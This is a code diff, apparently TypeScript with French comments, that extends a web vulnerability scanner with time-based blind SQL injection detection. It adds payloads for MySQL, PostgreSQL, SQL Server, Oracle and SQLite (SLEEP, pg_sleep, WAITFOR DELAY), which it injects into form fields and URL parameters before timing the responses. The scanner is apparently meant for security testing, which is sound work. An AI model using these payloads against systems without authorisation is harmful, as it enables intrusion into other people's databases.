@@ -14,6 +14,32 @@ const SQLI_PAYLOADS = [
   "' AND 1=1--",
 ];
 
+// ============================================
+// NOUVEAUX PAYLOADS BLIND SQLI TIME-BASED
+// ============================================
+const BLIND_SQLI_PAYLOADS = [
+  // MySQL
+  "' AND SLEEP(5)--",
+  "' OR SLEEP(5)--",
+  "1' AND SLEEP(5)--",
+  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+  
+  // PostgreSQL
+  "'; SELECT pg_sleep(5)--",
+  "' AND (SELECT 1 FROM pg_sleep(5))--",
+  
+  // SQL Server
+  "'; WAITFOR DELAY '0:0:5'--",
+  "' WAITFOR DELAY '0:0:5'--",
+  "1'; WAITFOR DELAY '0:0:5'--",
+  
+  // Oracle
+  "' AND DBMS_LOCK.SLEEP(5)--",
+  
+  // SQLite (pas de SLEEP natif, mais on teste quand même)
+  "' AND (SELECT COUNT(*) FROM sqlite_master)>0 AND RANDOMBLOB(100000000)--",
+];
+
 // Patterns d'erreur SQL
 const ERROR_PATTERNS = [
   /SQL syntax.*MySQL/i,
@@ -34,8 +60,11 @@ const ERROR_PATTERNS = [
   /Warning.*ora_/i,
 ];
 
+// Seuil de délai pour considérer une Blind SQLi (en millisecondes)
+const TIME_THRESHOLD = 4500; // 4.5 secondes (pour un SLEEP de 5s)
+
 /**
- * Scanne les vulnérabilités SQL Injection basiques
+ * Scanne les vulnérabilités SQL Injection basiques ET Blind SQLi
  * Teste les inputs et paramètres URL
  */
 export async function scanSQLi(target: string): Promise<Vulnerability[]> {
@@ -66,7 +95,8 @@ export async function scanSQLi(target: string): Promise<Vulnerability[]> {
 
       if (inputNames.length === 0) continue;
 
-      // Tester chaque payload
+      // === TEST 1 : SQLi CLASSIQUE (Error-based) ===
+      let foundClassicSQLi = false;
       for (const payload of SQLI_PAYLOADS) {
         const formUrl = new URL(action, target).href;
         const testResult = await testSQLiPayload(
@@ -80,14 +110,39 @@ export async function scanSQLi(target: string): Promise<Vulnerability[]> {
           vulnerabilities.push({
             type: 'sqli',
             severity: 'critical',
-            title: 'SQL Injection Vulnerability',
+            title: 'SQL Injection Vulnerability (Error-based)',
             description: `The application is vulnerable to SQL injection. The parameter "${testResult.parameter}" does not properly sanitize user input.`,
             location: formUrl,
             evidence: `Payload: ${payload}\nError: ${testResult.error}`,
           });
-
-          // Une seule vulnérabilité par formulaire suffit
+          foundClassicSQLi = true;
           break;
+        }
+      }
+
+      // === TEST 2 : BLIND SQLI TIME-BASED ===
+      if (!foundClassicSQLi) {
+        const formUrl = new URL(action, target).href;
+        
+        // Mesurer le temps de réponse normal (baseline)
+        const baselineTime = await measureResponseTime(formUrl, method, inputNames, 'test');
+        
+        // Tester les payloads time-based
+        for (const payload of BLIND_SQLI_PAYLOADS) {
+          const testTime = await measureResponseTime(formUrl, method, inputNames, payload);
+          
+          // Si le délai est significativement plus long, c'est une Blind SQLi
+          if (testTime - baselineTime >= TIME_THRESHOLD) {
+            vulnerabilities.push({
+              type: 'sqli',
+              severity: 'critical',
+              title: 'Blind SQL Injection Vulnerability (Time-based)',
+              description: `The application is vulnerable to Blind SQL injection. The parameter "${inputNames[0]}" is vulnerable to time-based attacks.`,
+              location: formUrl,
+              evidence: `Payload: ${payload}\nBaseline response time: ${baselineTime}ms\nDelay detected: ${testTime}ms (difference: ${testTime - baselineTime}ms)`,
+            });
+            break; // Une vulnérabilité par formulaire suffit
+          }
         }
       }
     }
@@ -97,6 +152,8 @@ export async function scanSQLi(target: string): Promise<Vulnerability[]> {
     const urlParams = Array.from(url.searchParams.keys());
 
     for (const param of urlParams) {
+      // === TEST 1 : SQLi CLASSIQUE sur URL ===
+      let foundClassicSQLiInUrl = false;
       for (const payload of SQLI_PAYLOADS) {
         const testUrl = new URL(target);
         testUrl.searchParams.set(param, payload);
@@ -107,21 +164,48 @@ export async function scanSQLi(target: string): Promise<Vulnerability[]> {
             headers: { 'User-Agent': 'VulnScanner/1.0' },
           });
 
-          // Vérifier les erreurs SQL dans la réponse
           const sqlError = detectSQLError(testResponse.data);
           if (sqlError) {
             vulnerabilities.push({
               type: 'sqli',
               severity: 'critical',
-              title: 'SQL Injection in URL Parameter',
+              title: 'SQL Injection in URL Parameter (Error-based)',
               description: `The URL parameter "${param}" is vulnerable to SQL injection.`,
               location: testUrl.href,
               evidence: `Payload: ${payload}\nError: ${sqlError}`,
             });
+            foundClassicSQLiInUrl = true;
             break;
           }
         } catch (error) {
           // Ignorer les erreurs de requête
+        }
+      }
+
+      // === TEST 2 : BLIND SQLI TIME-BASED sur URL ===
+      if (!foundClassicSQLiInUrl) {
+        // Mesurer le temps de baseline
+        const baselineUrl = new URL(target);
+        baselineUrl.searchParams.set(param, 'test');
+        const baselineTime = await measureUrlResponseTime(baselineUrl.href);
+
+        // Tester les payloads time-based
+        for (const payload of BLIND_SQLI_PAYLOADS) {
+          const testUrl = new URL(target);
+          testUrl.searchParams.set(param, payload);
+          const testTime = await measureUrlResponseTime(testUrl.href);
+
+          if (testTime - baselineTime >= TIME_THRESHOLD) {
+            vulnerabilities.push({
+              type: 'sqli',
+              severity: 'critical',
+              title: 'Blind SQL Injection in URL Parameter (Time-based)',
+              description: `The URL parameter "${param}" is vulnerable to Blind SQL injection using time-based techniques.`,
+              location: target,
+              evidence: `Payload: ${payload}\nBaseline: ${baselineTime}ms\nDelay detected: ${testTime}ms (difference: ${testTime - baselineTime}ms)`,
+            });
+            break;
+          }
         }
       }
     }
@@ -134,7 +218,7 @@ export async function scanSQLi(target: string): Promise<Vulnerability[]> {
 }
 
 /**
- * Teste un payload SQL injection sur un formulaire
+ * Teste un payload SQL injection sur un formulaire (error-based)
  */
 async function testSQLiPayload(
   url: string,
@@ -162,7 +246,6 @@ async function testSQLiPayload(
       });
     }
 
-    // Vérifier les erreurs SQL
     const sqlError = detectSQLError(response.data);
     if (sqlError) {
       return {
@@ -176,6 +259,60 @@ async function testSQLiPayload(
   }
 
   return { vulnerable: false };
+}
+
+/**
+ * NOUVELLE FONCTION : Mesure le temps de réponse d'une requête sur un formulaire
+ */
+async function measureResponseTime(
+  url: string,
+  method: string,
+  params: string[],
+  payload: string
+): Promise<number> {
+  const startTime = Date.now();
+  
+  try {
+    const data: Record<string, string> = {};
+    params.forEach(param => {
+      data[param] = payload;
+    });
+
+    if (method === 'post') {
+      await axios.post(url, data, {
+        timeout: 15000, // Timeout plus long pour les time-based
+        headers: { 'User-Agent': 'VulnScanner/1.0' },
+      });
+    } else {
+      await axios.get(url, {
+        params: data,
+        timeout: 15000,
+        headers: { 'User-Agent': 'VulnScanner/1.0' },
+      });
+    }
+  } catch (error) {
+    // Même en cas d'erreur, on mesure le temps
+  }
+
+  return Date.now() - startTime;
+}
+
+/**
+ * NOUVELLE FONCTION : Mesure le temps de réponse d'une URL
+ */
+async function measureUrlResponseTime(url: string): Promise<number> {
+  const startTime = Date.now();
+  
+  try {
+    await axios.get(url, {
+      timeout: 15000,
+      headers: { 'User-Agent': 'VulnScanner/1.0' },
+    });
+  } catch (error) {
+    // Même en cas d'erreur, on mesure le temps
+  }
+
+  return Date.now() - startTime;
 }
 
 /**
